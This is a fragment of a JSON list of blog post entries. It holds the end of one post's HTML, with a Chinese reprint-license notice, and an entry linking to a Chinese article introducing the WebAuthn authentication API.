</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]